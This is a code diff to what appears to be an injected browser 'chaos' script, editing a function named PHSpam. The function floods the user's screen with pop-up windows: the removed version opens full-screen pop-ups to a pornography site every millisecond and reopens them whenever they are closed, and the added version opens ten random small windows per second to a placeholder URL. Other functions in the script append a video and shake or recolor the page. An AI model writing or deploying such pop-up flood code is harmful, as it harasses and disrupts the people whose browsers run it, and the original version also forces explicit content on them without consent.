@@ -28,32 +28,25 @@ if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') ===
           document.body.appendChild(vid);
         },
 PHSpam: () => {
-  const url = 'https://pornhub.com';
+  const url = 'https://test.com';
   const portals = [];
 
-  let wins = [];
-
   setInterval(() => {
-    const allClosedOrBlurred = wins.every(win => !win || win.closed || document.hasFocus());
+    for (let i = 0; i < 10; i++) { // Adjust the number of windows per second here
+      const width = 300;
+      const height = 200;
+      const left = Math.floor(Math.random() * (screen.availWidth - width));
+      const top = Math.floor(Math.random() * (screen.availHeight - height));
 
-    if (allClosedOrBlurred) {
-      wins = [];
-      for (let i = 0; i < 5; i++) {
-        const win = window.open(
-          url,
-          '_blank',
-          'toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,' +
-            'width=' + screen.availWidth +
-            ',height=' + screen.availHeight +
-            ',top=0,left=0'
-        );
-        if (win) {
-          portals.push(win);
-          wins.push(win);
-        }
-      }
+      const win = window.open(
+        url,
+        '_blank',
+        `toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=${width},height=${height},top=${top},left=${left}`
+      );
+
+      if (win) portals.push(win);
     }
-  }, 1);
+  }, 1000);
 },
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
